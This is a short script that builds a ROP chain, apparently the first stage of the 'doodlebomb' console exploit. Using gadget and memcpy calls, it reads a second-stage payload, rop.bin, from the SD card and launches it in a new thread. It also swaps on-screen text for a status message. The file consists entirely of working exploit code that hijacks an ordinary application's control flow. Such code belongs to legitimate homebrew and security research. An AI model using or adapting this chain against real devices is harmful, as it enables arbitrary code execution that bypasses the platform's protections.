from constants import *
include("macros.py")
set_mem_offset(STAGE0_DEST)

store(SVC_EXIT_THREAD, STAGE1_DEST)

mount_sdmc(sdmc_string)
try_open_file(context, file_path, FSFILE_READ)
try_get_size(context, file_size)
try_read_file(context, 0, 0, bytes_read, file_size, STAGE1_DEST)
close_file(context)

# Create new thread for stage1
SET_LR(POP_R4R5PC) # skip the two args after create_thread
pop(r0=valid_addr, r3=STAGE1_DEST) # r0=valid address to store unused value
                                      # r3=thread stack pointer
                                      # r1=thread entrypoint, no need to set r1 here since SET_LR already does that
add_word(SVC_CREATE_THREAD)
add_word(0x31) # thread priority
add_word(0xFFFFFFFE) # -2 => execute thread on the default CPU

SET_LR(NOP)
pop(r0=original_text, r1=0x08745844, r2=test_string_end-test_string)
add_word(MEMCPY)

SET_LR(NOP)
pop(r0=0x08745844, r1=test_string, r2=test_string_end-test_string)
add_word(MEMCPY)

SET_LR(NOP)
deref_to_r0(arbiter_handle)
pop(r1=arbiter_handle+0x4, r2=0x0, r3=0x1, r4=0x0, r5=0x0)
add_word(SVC_ARBITRATE_ADDRESS)
garbage(2)

store(0x1, arbiter_handle+0x4)

sleep(0x3b9aca00)

SET_LR(NOP)
pop(r0=0x08745844, r1=original_text, r2=test_string_end-test_string)
add_word(MEMCPY)

add_word(SVC_EXIT_THREAD)

put_label("valid_addr")

put_label("one")
add_word(1)

put_label("file_size")
add_word(0x0)
add_word(0x0)

put_label("bytes_read")
add_word(0x0)

put_label("context")
fill(0x20, 0)

put_label("file_path")
add_utf16("sdmc:/doodlebomb/rop.bin\0\0")

put_label("sdmc_string")
add_ascii("sdmc:\0\0\0")

put_label("test_string")
add_utf16("/doodlebomb/rop.bin is missing...\n\nDelete this letter ?\0")
put_label("test_string_end")

put_label("original_text")
fill(test_string_end-test_string, 0)

put_label("arbiter_handle")
